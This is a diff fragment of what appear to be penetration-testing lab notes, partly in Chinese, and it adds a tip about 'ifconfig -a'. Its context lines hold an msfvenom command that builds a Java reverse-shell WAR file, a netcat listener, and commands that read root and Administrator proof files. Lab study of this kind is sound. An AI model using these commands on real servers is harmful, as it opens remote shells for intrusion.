@@ -4,3 +4,4 @@ msfvenom -p java/shell_reverse_tcp LHOST=自己 LPORT=442 -f war > evil.war
 nc -lvp 443
 type "C:\Documents and Settings\Administrator\Desktop\proof.txt"
 cat /root/proof.txt
+ifconfig沒反應....用 ifconfig-a
